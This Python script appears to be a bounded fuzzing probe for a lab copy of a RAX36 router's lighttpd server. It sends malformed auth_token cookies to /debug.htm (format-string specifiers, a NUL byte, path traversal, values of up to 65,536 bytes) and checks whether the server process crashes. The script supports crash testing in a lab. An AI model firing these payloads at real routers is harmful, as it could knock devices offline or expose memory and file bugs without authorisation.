#!/usr/bin/env python3
"""Bounded malformed auth-token HTTP probe for the isolated RAX36 web lab."""

from __future__ import annotations

import os
import socket
import time


HOST = "127.0.0.1"
PORT = 25137
PATH = "/debug.htm"


def lighttpd_pids() -> list[int]:
    result: list[int] = []
    for entry in os.scandir("/proc"):
        if not entry.name.isdigit():
            continue
        try:
            command = open(f"/proc/{entry.name}/cmdline", "rb").read()
        except OSError:
            continue
        if b"/usr/sbin/lighttpd" in command:
            result.append(int(entry.name))
    return sorted(result)


def request(cookie: bytes) -> tuple[str, int]:
    payload = (
        f"GET {PATH} HTTP/1.1\r\nHost: routerlogin.net\r\n".encode()
        + b"Cookie: "
        + cookie
        + b"\r\nConnection: close\r\n\r\n"
    )
    data = bytearray()
    with socket.create_connection((HOST, PORT), timeout=2) as client:
        client.settimeout(2)
        client.sendall(payload)
        while len(data) < 4096:
            try:
                chunk = client.recv(4096 - len(data))
            except TimeoutError:
                break
            if not chunk:
                break
            data.extend(chunk)
    status = data.split(b"\r\n", 1)[0].decode("ascii", "replace")
    return status, len(data)


def main() -> int:
    cases = [
        ("empty", b"auth_token="),
        ("one-byte", b"auth_token=A"),
        ("nul-escaped", b"auth_token=%00"),
        ("format", b"auth_token=%s%s%s%n"),
        ("traversal", b"auth_token=../../../../tmp/codex-canary"),
        ("duplicate", b"auth_token=A; auth_token=B"),
        ("quoted", b'auth_token="' + b"A" * 512 + b'"'),
        ("len-1024", b"auth_token=" + b"A" * 1024),
        ("len-4096", b"auth_token=" + b"A" * 4096),
        ("len-8192", b"auth_token=" + b"A" * 8192),
        ("len-16384", b"auth_token=" + b"A" * 16384),
        ("len-65536", b"auth_token=" + b"A" * 65536),
    ]
    before = lighttpd_pids()
    if not before:
        print("baseline_failed=no_lighttpd_process")
        return 2
    for name, cookie in cases:
        try:
            status, response_bytes = request(cookie)
        except OSError as error:
            status, response_bytes = f"ERROR:{type(error).__name__}", 0
        time.sleep(0.1)
        after = lighttpd_pids()
        alive = bool(set(before) & set(after))
        print(
            f"{name} cookie_bytes={len(cookie)} status={status!r} "
            f"response_bytes={response_bytes} pids={','.join(map(str, after)) or 'none'} "
            f"alive={alive}"
        )
        if not alive:
            print(f"crash_candidate={name}")
            return 1
    try:
        status, response_bytes = request(b"auth_token=health-check")
    except OSError as error:
        print(f"post_health=ERROR:{type(error).__name__}")
        return 1
    print(f"post_health={status!r} response_bytes={response_bytes}")
    print("result=no-observable-auth-token-dos")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
